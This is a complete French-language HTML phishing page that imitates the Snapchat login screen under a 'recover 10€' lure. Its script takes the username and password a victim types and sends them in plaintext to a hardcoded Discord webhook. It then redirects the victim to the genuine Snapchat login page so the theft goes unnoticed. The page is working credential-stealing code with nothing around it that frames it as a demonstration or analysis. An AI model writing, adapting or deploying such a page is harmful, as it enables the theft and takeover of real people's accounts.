<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snapchat Récuperer 10€</title>

  <head>
    <meta property="og:title" content="Titre personnalisé de ma page" />
    <meta property="og:description" content="Description qui apparaîtra avec mon lien" />
    <meta property="og:image" content="https://ton-site.com/images/image-apercu.png" />
    <meta property="og:url" content="https://ton-site.com/ma-page" />
    <meta property="og:type" content="website" />
  </head>

  
  <style>
    body {
      margin: 0; padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f0f0; /* fond gris clair */
      display: flex; justify-content: center; align-items: center;
      height: 100vh;
      color: #000; /* texte noir par défaut */
    }
    .login-box {
      width: 100%; max-width: 400px;
      padding: 40px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      border-radius: 10px;
      text-align: center;
      background-color: #fff; /* fond blanc de la boîte */
      color: #000;
    }
    .logo {
      width: 80px;
      margin: 0 auto 20px auto;
      display: block;
    }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      background-color: #fff;
      color: #000;
    }
    button {
      background-color: #fffc00;
      border: none; color: #000;
      font-weight: bold; padding: 12px;
      width: 100%; border-radius: 8px;
      cursor: pointer; margin-top: 20px;
      font-size: 16px;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #e6e600;
    }
    #errorMessage {
      color: red;
      display: none;
      margin-top: 10px;
      font-size: 14px;
    }
    .links-container {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 14px;
    }
    .link-button {
      background: transparent;
      border: none;
      color: blue;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      padding: 0;
      font-family: inherit;
      font-size: inherit;
      text-decoration: underline;
    }
    #forgotPassword {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
    <h2>Connexion snapchat</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <button type="submit">Connexion</button>
      <div class="links-container">
        <button type="button" class="link-button" id="signupLink">S'inscrire</button>
        <button type="button" class="link-button" id="forgotPassword">Mot de passe oublié</button>
      </div>
    </form>
    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login?continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fwww.snapchat.com%252Fweb%252Ff3411d81-73e7-59d1-a928-9af58b989e8a";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const errorMessage = document.getElementById('errorMessage');

      if (
        username.length < 3 ||
        password.length < 3 ||
        username.includes(" ") ||
        password.includes(" ")
      ) {
        errorMessage.style.display = 'block';
        return;
      } else {
        errorMessage.style.display = 'none';
      }

      const message = {
        content: `**Nouveau login reçu:**\nNom d'utilisateur: ${username}\nMot de passe: ${password}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(message),
      })
      .then(response => {
        if (response.ok) {
          alert("Données envoyées avec succès !");
          document.getElementById('loginForm').reset();
          window.location.href = redirectURL;
        } else {
          alert("Erreur lors de l'envoi des données.");
        }
      })
      .catch(error => {
        alert("Erreur réseau ou CORS.");
        console.error(error);
      });
    });

    document.getElementById('signupLink').addEventListener('click', () => {
      alert("Redirection vers la page d'inscription...");
    });

    document.getElementById('forgotPassword').addEventListener('click', () => {
      alert("Redirection vers la récupération de mot de passe...");
    });
  </script>
</body>
</html>
